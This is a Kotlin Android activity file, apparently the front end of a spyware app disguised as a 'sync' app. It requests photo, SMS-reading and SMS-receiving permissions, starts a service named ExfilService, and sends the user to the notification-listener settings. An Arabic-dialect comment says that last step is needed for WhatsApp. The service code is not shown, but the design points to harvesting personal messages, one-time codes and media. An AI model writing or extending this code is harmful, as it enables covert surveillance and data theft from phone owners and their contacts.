package com.example.sync

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    private val REQ = 1

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        findViewById<Button>(R.id.btnStart).setOnClickListener {
            val perms = buildList {
                if (Build.VERSION.SDK_INT >= 33) {
                    add(Manifest.permission.READ_MEDIA_IMAGES)
                    add(Manifest.permission.POST_NOTIFICATIONS)
                } else {
                    add(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
                add(Manifest.permission.READ_SMS)
                add(Manifest.permission.RECEIVE_SMS)
            }

            val missing = perms.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }

            if (missing.isEmpty()) startNow()
            else ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ)
        }
    }

    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
        super.onRequestPermissionsResult(r, p, g)
        if (r == REQ) {
            if (g.isNotEmpty() && g.all { it == PackageManager.PERMISSION_GRANTED }) startNow()
            else Toast.makeText(this, "لازم الصلاحيات", Toast.LENGTH_LONG).show()
        }
    }

    private fun startNow() {
        val i = Intent(this, ExfilService::class.java)
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)

        // كتفتح صفحة تفعيل الوصول للإشعارات (ضروري لواتساب)
        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))

        Toast.makeText(this, "تم", Toast.LENGTH_SHORT).show()
    }
}
